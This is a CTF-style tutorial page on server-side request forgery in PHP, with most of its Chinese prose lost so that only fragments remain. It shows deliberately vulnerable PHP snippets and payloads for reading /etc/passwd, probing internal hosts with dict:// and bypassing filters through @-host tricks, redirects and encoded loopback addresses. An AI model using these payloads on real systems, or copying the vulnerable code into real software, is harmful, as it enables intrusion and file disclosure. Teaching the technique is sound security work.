data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201984.jpeg\"\n                        alt=\"SSRF\"\n                 ></p>\n<blockquote>\n<p>FreeBufFreeBuf</p>\n</blockquote>\n<p>CTFSSRFSSRFSSRF</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>SSRFServer-Side Request Forgery:SSRF</p>\n<p>SSRF URLSSRFWEB</p>\n<p>UbuntuWEBUbuntuWEBSSRFWEBRedisMySqlFastCGIWEB<img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small\"\n                        alt=\"image-20210112220229389\"\n                 ></p>\n<p><strong>SSRF</strong></p>\n<blockquote>\n<ol>\n<li><p></p>\n</li>\n<li><p>URL</p>\n</li>\n<li><p></p>\n</li>\n<li><p>&#x2F;URL</p>\n</li>\n<li><p>&#x2F;URLtitle</p>\n</li>\n<li><p>ssrf</p>\n</li>\n<li><p>url</p>\n</li>\n<li><p>mongodbcopyDatabase</p>\n</li>\n<li><p></p>\n</li>\n<li><p>ffpmgImageMagickdocxpdfxml</p>\n</li>\n<li><p>apiURLgoogleSSRFurlsharewapurllinksrcsourcetargetu3gdisplaysourceURlimageURLdomain</p>\n</li>\n<li><p></p>\n</li>\n</ol>\n</blockquote>\n<p><strong>SSRF</strong></p>\n<blockquote>\n<ol>\n<li><p>banner</p>\n</li>\n<li><p>redismysql</p>\n</li>\n<li><p>Web</p>\n</li>\n<li><p>WebHTTP GET&#x2F;POSTsql</p>\n</li>\n<li><p>file</p>\n</li>\n<li><p></p>\n</li>\n</ol>\n</blockquote>\n<h2 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h2><ul>\n<li><p>file_get_contents()url</p>\n</li>\n<li><p>readfile()</p>\n</li>\n<li><p>fsockopen()Unix </p>\n</li>\n<li><p>curl_exec()cURLcurl_setopt()curl_exec()curl_close() </p>\n</li>\n<li><p>fopen() URL</p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<p>SSRF PHPSoapClientSSRF</p>\n<h3 id=\"file-get-contents\"><a href=\"#file-get-contents\" class=\"headerlink\" title=\"file_get_contents()\"></a>file_get_contents()</h3><p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = $\\_GET\\[&#x27;url&#x27;\\];;</span><br><span class=\"line\">echo file\\_get\\_contents($url);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>file_get_contents() url<code>ssrf.php?url=../../../../../etc/passwd</code>paylaod</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597996_5fffc66c9d8087b2c3242.png!small\"\n                        alt=\"image-20210112225820457\"\n                 ></p>\n<p>readfile()file_get_contents()</p>\n<h3 id=\"fsockopen\"><a href=\"#fsockopen\" class=\"headerlink\" title=\"fsockopen()\"></a>fsockopen()</h3><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>Unix hostnameurlsockettcp fsockopen()fgets()fgetss()fwrite()fclose()feof()false</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$host=$\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">$fp = fsockopen($host, 80, $errno, $errstr, 30);</span><br><span class=\"line\">if (!$fp) &#123;</span><br><span class=\"line\">    echo &quot;$errstr ($errno)&lt;br /&gt;\\\\n&quot;;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $out = &quot;GET / HTTP/1.1\\\\r\\\\n&quot;;</span><br><span class=\"line\">    $out .= &quot;Host: $host\\\\r\\\\n&quot;;</span><br><span class=\"line\">    $out .= &quot;Connection: Close\\\\r\\\\n\\\\r\\\\n&quot;;</span><br><span class=\"line\">    fwrite($fp, $out);</span><br><span class=\"line\">    while (!feof($fp)) &#123;</span><br><span class=\"line\">        echo fgets($fp, 128);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fclose($fp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>ssrf.php?url=www.baidu.com</code>ssrf</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201642.jpeg\"\n                        alt=\"image-20210112230552313\"\n                 ></p>\n<h3 id=\"curl-exec\"><a href=\"#curl-exec\" class=\"headerlink\" title=\"curl_exec()\"></a>curl_exec()</h3><p>curl_init(url)cURLcurl_setopt()curl_exec()curl_close() </p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">if (isset($\\_GET\\[&#x27;url&#x27;\\]))&#123;</span><br><span class=\"line\">\t$link = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">\t$curlobj = curl\\_init(); //  cURL </span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); //  URL </span><br><span class=\"line\">\t$result=curl\\_exec($curlobj); //  URL </span><br><span class=\"line\">\tcurl\\_close($curlobj); //  cURL </span><br></pre></td></tr></table></figure>\n\n\n\n<pre><code>// $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;\n// file\\_put\\_contents($filename, $result); \necho $result;\n</code></pre>\n<p>}<br>?&gt;</p>\n<p><code>ssrf.php?url=www.baidu.com</code>ssrf</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201758.jpeg\"\n                        alt=\"image-20210112231108247\"\n                 ></p>\n<h3 id=\"SoapClient\"><a href=\"#SoapClient\" class=\"headerlink\" title=\"SoapClient\"></a>SoapClient</h3><p>SOAPSOAP XML  WEB PHP  SoapClient SOAP WEB  PHP </p>\n<p>SoapClientphp<code>__call</code><code>__call</code>HTTPHTTPS</p>\n<p>public SoapClient :: SoapClient(mixed $wsdl [array $options ])</p>\n<ul>\n<li><p>wsdl</p>\n</li>\n<li><p>wsdlwsdllocationurilocationSOAPURL uri SOAP</p>\n</li>\n</ul>\n<p>SSRFPayloadnulllocationurilocationtarget_url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$a = new SoapClient(null,array(&#x27;uri&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333&#x27;, &#x27;location&#x27;=&gt;&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;));  </span><br><span class=\"line\">$b = serialize($a);  </span><br><span class=\"line\">echo $b;  </span><br><span class=\"line\">$c = unserialize($b);  </span><br><span class=\"line\">$c-&gt;a();    // , \\_\\_callssrf  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>47.xxx.xxx.722333ssrf.php47.xxx.xxx.72</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610597999_5fffc66f758c21c129c42.png!small\"\n                        alt=\"image-20210112234821125\"\n                 ></p>\n<p>ssrf</p>\n<p>http&#x2F;httpshttpcrlfssrf+crlfhttp<a class=\"link\"   href=\"https://www.anquanke.com/post/id/202025\" >SoapClient+crlfSSRF<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h3><p>SSRF</p>\n<ul>\n<li><p>file  file </p>\n</li>\n<li><p>dictredis</p>\n</li>\n<li><p>gophergopherGETPOSTgetpostgophergopherssrf()shell</p>\n</li>\n<li><p>http&#x2F;s</p>\n</li>\n</ul>\n<p></p>\n<h2 id=\"filehttp-sdict\"><a href=\"#filehttp-sdict\" class=\"headerlink\" title=\"filehttp&#x2F;sdict\"></a>filehttp&#x2F;sdict</h2><p>SSRF</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">if (isset($\\_GET\\[&#x27;url&#x27;\\]))&#123;</span><br><span class=\"line\">\t$link = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">\t$curlobj = curl\\_init(); //  cURL </span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);</span><br><span class=\"line\">\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); //  URL </span><br><span class=\"line\">\t$result=curl\\_exec($curlobj); //  URL </span><br><span class=\"line\">\tcurl\\_close($curlobj); //  cURL </span><br></pre></td></tr></table></figure>\n\n\n\n<pre><code>// $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;\n// file\\_put\\_contents($filename, $result); \necho $result;\n</code></pre>\n<p>}<br>?&gt;</p>\n<h3 id=\"file\"><a href=\"#file\" class=\"headerlink\" title=\"file\"></a>file</h3><p>payload</p>\n<p>ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598000_5fffc670560e2d6fed29c.png!small\"\n                        alt=\"image-20210113000529370\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201861.jpeg\"\n                        alt=\"image-20210113000640979\"\n                 ></p>\n<h3 id=\"http-s\"><a href=\"#http-s\" class=\"headerlink\" title=\"http&#x2F;s\"></a>http&#x2F;s</h3><p>&#x2F;etc&#x2F;hosts&#x2F;proc&#x2F;net&#x2F;arp&#x2F;proc&#x2F;net&#x2F;fib_trie</p>\n<p>IPIPIP</p>\n<ul>\n<li><p>C192.168.0.0 - 192.168.255.255</p>\n</li>\n<li><p>B172.16.0.0 - 172.31.255.255</p>\n</li>\n<li><p>A10.0.0.0 - 10.255.255.255</p>\n</li>\n</ul>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201380.jpeg\"\n                        alt=\"image-20210113190506825\"\n                 ></p>\n<p>WEBUbuntuSSRFpayloadUbuntu</p>\n<p>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.1/\" >http://192.168.52.1<i class=\"fas fa-external-link-alt\"></i></a><br>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.6/\" >http://192.168.52.6<i class=\"fas fa-external-link-alt\"></i></a><br>ssrf.php?url&#x3D;<a class=\"link\"   href=\"http://192.168.52.25/\" >http://192.168.52.25<i class=\"fas fa-external-link-alt\"></i></a><br></p>\n<p>burpsuiteIntruder</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598003_5fffc67301c9d222a58c6.png!small\"\n                        alt=\"image-20210113120505690\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201508.jpeg\"\n                        alt=\"image-20210113120551977\"\n                 ></p>\n<p>192.168.52.130192.168.52.131</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598005_5fffc6750b23dd040c364.png!small\"\n                        alt=\"image-20210113120806794\"\n                 ></p>\n<h3 id=\"http-sdict\"><a href=\"#http-sdict\" class=\"headerlink\" title=\"http&#x2F;sdict\"></a>http&#x2F;sdict</h3><p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598006_5fffc67625206702cdd18.png!small\"\n                        alt=\"image-20210113190455756\"\n                 ></p>\n<p>dictpayload</p>\n<p>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.131:6379&#x2F;info   &#x2F;&#x2F; redis<br>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.131:80&#x2F;info     &#x2F;&#x2F; http<br>ssrf.php?url&#x3D;dict:&#x2F;&#x2F;192.168.52.130:22&#x2F;info   &#x2F;&#x2F; ssh</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201787.jpeg\"\n                        alt=\"image-20210113190244954\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201476.jpeg\"\n                        alt=\"image-20210113122530377\"\n                 ></p>\n<p>burpsuite</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p>SSRF</p>\n<ul>\n<li><p>WebHTTPHTTPS</p>\n</li>\n<li><p><a class=\"link\"   href=\"http://www.xxx.com/\" >http://www.xxx.com<i class=\"fas fa-external-link-alt\"></i></a></p>\n</li>\n<li><p>IP</p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<h3 id=\"HTTP\"><a href=\"#HTTP\" class=\"headerlink\" title=\"HTTP\"></a>HTTP</h3><p> <a class=\"link\"   href=\"http://www.xxx.com/\" >http://www.xxx.com<i class=\"fas fa-external-link-alt\"></i></a>HTTP@<a class=\"link\"   href=\"http://www.evil.com/\" >http:&#x2F;&#x2F;www.xxx.com@www.evil.com<i class=\"fas fa-external-link-alt\"></i></a></p>\n<h3 id=\"302IP\"><a href=\"#302IP\" class=\"headerlink\" title=\"302IP\"></a>302IP</h3><p>ip<strong>302</strong></p>\n<p>1 <a class=\"link\"   href=\"http://xip.io/\" >http://xip.io<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"http://127.0.0.1.xip.io/flag.php\" >http://127.0.0.1.xip.io/flag.php<i class=\"fas fa-external-link-alt\"></i></a><a class=\"link\"   href=\"http://127.0.0.1/1.php\" >http://127.0.0.1/1.php<i class=\"fas fa-external-link-alt\"></i></a><a class=\"link\"   href=\"http://nip.io/\" >http://nip.io<i class=\"fas fa-external-link-alt\"></i></a><a class=\"link\"   href=\"http://sslip.io/\" >http://sslip.io<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>flag.php</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598008_5fffc67858617e4b20974.png!small\"\n                        alt=\"image-20210113124813254\"\n                 ></p>\n<p>2 <a class=\"link\"   href=\"https://4m.cn/\" >https://4m.cn/<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201164.jpeg\"\n                        alt=\"image-20201027163528110\"\n                 ></p>\n<p> <a class=\"link\"   href=\"https://4m.cn/FjOdQ\" >https://4m.cn/FjOdQ<i class=\"fas fa-external-link-alt\"></i></a>302 <a class=\"link\"   href=\"http://127.0.0.1/flag.php\" >http://127.0.0.1/flag.php<i class=\"fas fa-external-link-alt\"></i></a>WAF</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598010_5fffc67a644209d507f01.png!small\"\n                        alt=\"image-20210113124727560\"\n                 ></p>\n<h3 id=\"IP\"><a href=\"#IP\" class=\"headerlink\" title=\"IP\"></a>IP</h3><p>ipWAFphp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">$ip = &#x27;127.0.0.1&#x27;;  </span><br><span class=\"line\">$ip = explode(&#x27;.&#x27;,$ip);  </span><br><span class=\"line\">$r = ($ip\\[0\\] &lt;&lt; 24) | ($ip\\[1\\] &lt;&lt; 16) | ($ip\\[2\\] &lt;&lt; 8) | $ip\\[3\\] ;  </span><br><span class=\"line\">if($r &lt; 0) &#123;  </span><br><span class=\"line\">$r += 4294967296;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">echo &quot;:&quot;;     // 2130706433  </span><br><span class=\"line\">echo $r;  </span><br><span class=\"line\">echo &quot;:&quot;;     // 0177.0.0.1  </span><br><span class=\"line\">echo decoct($r);  </span><br><span class=\"line\">echo &quot;:&quot;;   // 0x7f.0.0.1  </span><br><span class=\"line\">echo dechex($r);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"127-0-0-1\"><a href=\"#127-0-0-1\" class=\"headerlink\" title=\"127.0.0.1\"></a>127.0.0.1</h3><p><a class=\"link\"   href=\"http://localhost/\" >http://localhost/<i class=\"fas fa-external-link-alt\"></i></a>         # localhost127.0.0.1<br><a class=\"link\"   href=\"http://0.0.0.0/\" >http://0/<i class=\"fas fa-external-link-alt\"></i></a>                 # 0window0.0.0.0liunx127.0.0.1<br>http:&#x2F;&#x2F;[0:0:0:0:0:ffff:127.0.0.1]&#x2F;    # liunxwindow<br>http:&#x2F;&#x2F;[::]:80&#x2F;           # liunxwindow<br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127001/<i class=\"fas fa-external-link-alt\"></i></a>       # <br>http:&#x2F;&#x2F;...<br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127.1/<i class=\"fas fa-external-link-alt\"></i></a><br><a class=\"link\"   href=\"http://127.0.0.1/\" >http://127.00000.00000.001/<i class=\"fas fa-external-link-alt\"></i></a> # 0127.0.0.1</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p><code>file_get_contents()</code>PHP<code>file_get_contents()</code>include()</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php  </span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">highlight\\_file(\\_\\_FILE\\_\\_);  </span><br><span class=\"line\">if(!preg\\_match(&#x27;/^https/is&#x27;,$\\_GET\\[&#x27;url&#x27;\\]))&#123;  </span><br><span class=\"line\">die(&quot;no hack&quot;);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">echo file\\_get\\_contents($\\_GET\\[&#x27;url&#x27;\\]);  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>urlhttps</p>\n<p>httpsssss:&#x2F;&#x2F;</p>\n<p><code>file_get_contents()</code>httpsssss:&#x2F;&#x2F;</p>\n<p>ssrf.php?url&#x3D;httpsssss:&#x2F;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598011_5fffc67b28e67ca0b6d7f.png!small\"\n                        alt=\"image-20210113130534208\"\n                 ></p>\n<p>SSRF</p>\n<h3 id=\"URL\"><a href=\"#URL\" class=\"headerlink\" title=\"URL\"></a>URL</h3><p>Orange Tsai2017 BlackHat <a class=\"link\"   href=\"https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf\" >A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages<i class=\"fas fa-external-link-alt\"></i></a>readfileparse_urlcurlparse_url</p>\n<p><strong>1readfileparse_url</strong></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ssrf.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$url = &#x27;http://&#x27;. $\\_GET\\[url\\];</span><br><span class=\"line\">$parsed = parse\\_url($url);</span><br><span class=\"line\">if( $parsed\\[port\\] == 80 )&#123;  // url80</span><br><span class=\"line\">\treadfile($url);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">\tdie(&#x27;Hacker!&#x27;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>python11211WEB</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201658.jpeg\"\n                        alt=\"image-20210113133210683\"\n                 ></p>\n<p>url8011211</p>\n<p>ssrf.php?url&#x3D;127.0.0.1:11211:80&#x2F;flag.txt</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202332.jpeg\"\n                        alt=\"image-20210113133242461\"\n                 ></p>\n<p>11211flag.txtBlackHat</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696\"\n                        alt=\"1610601312_5fffd36035478c41c2c18.png!small?1610601312696\"\n                 ></p>\n<p>readfile()11211parse_url()80WAF</p>\n<p>host</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610601347_5fffd383dfc1a3982425f.png!small?1610601348433\"\n                        alt=\"1610601347_5fffd383dfc1a3982425f.png!small?1610601348433\"\n                 ></p>\n<p>readfile()@evil.comparse_url()@google.comparse_url()host</p>\n<p><strong>2curlparse_urlhost</strong></p>\n<p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202234.jpeg\"\n                        alt=\"1610601386_5fffd3aa565a51587d90c.png!small?1610601386867\"\n                 ></p>\n<p>curl()@parse_url()@parse_url()host</p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">highlight\\_file(\\_\\_FILE\\_\\_);</span><br><span class=\"line\">function check\\_inner\\_ip($url)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $match\\_result=preg\\_match(&#x27;/^(http|https)?:\\\\/\\\\/.\\*(\\\\/)?.\\*$/&#x27;,$url);</span><br><span class=\"line\">    if (!$match\\_result)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(&#x27;url fomat error&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    try</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $url\\_parse=parse\\_url($url);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    catch(Exception $e)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(&#x27;url fomat error&#x27;);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $hostname=$url\\_parse\\[&#x27;host&#x27;\\];</span><br><span class=\"line\">    $ip=gethostbyname($hostname);</span><br><span class=\"line\">    $int\\_ip=ip2long($ip);</span><br><span class=\"line\">    return ip2long(&#x27;127.0.0.0&#x27;)&gt;&gt;24 == $int\\_ip&gt;&gt;24 || ip2long(&#x27;10.0.0.0&#x27;)&gt;&gt;24 == $int\\_ip&gt;&gt;24 || ip2long(&#x27;172.16.0.0&#x27;)&gt;&gt;20 == $int\\_ip&gt;&gt;20 || ip2long(&#x27;192.168.0.0&#x27;)&gt;&gt;16 == $int\\_ip&gt;&gt;16;// ip</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function safe\\_request\\_url($url)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (check\\_inner\\_ip($url))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        echo $url.&#x27; is inner ip&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $ch = curl\\_init();</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_URL, $url);</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_RETURNTRANSFER, 1);</span><br><span class=\"line\">        curl\\_setopt($ch, CURLOPT\\_HEADER, 0);</span><br><span class=\"line\">        $output = curl\\_exec($ch);</span><br><span class=\"line\">        $result\\_info = curl\\_getinfo($ch);</span><br><span class=\"line\">        if ($result\\_info\\[&#x27;redirect\\_url&#x27;\\])</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            safe\\_request\\_url($result\\_info\\[&#x27;redirect\\_url&#x27;\\]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl\\_close($ch);</span><br><span class=\"line\">        var\\_dump($output);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$url = $\\_GET\\[&#x27;url&#x27;\\];</span><br><span class=\"line\">if(!empty($url))&#123;</span><br><span class=\"line\">    safe\\_request\\_url($url);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>check_inner_ip</code><code>url_parse()</code>IP IP <code>curl()</code> url 